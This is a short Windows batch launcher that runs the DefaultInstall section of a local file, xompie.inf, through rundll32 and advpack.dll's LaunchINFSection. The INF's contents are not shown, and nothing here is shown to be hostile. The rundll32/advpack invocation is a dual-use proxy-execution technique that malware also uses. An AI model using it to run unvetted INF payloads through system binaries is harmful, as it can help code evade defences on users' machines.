@echo off
cd /d "%~dp0"
if %ERRORLEVEL% equ 0 rundll32 advpack.dll,LaunchINFSection xompie.inf,DefaultInstall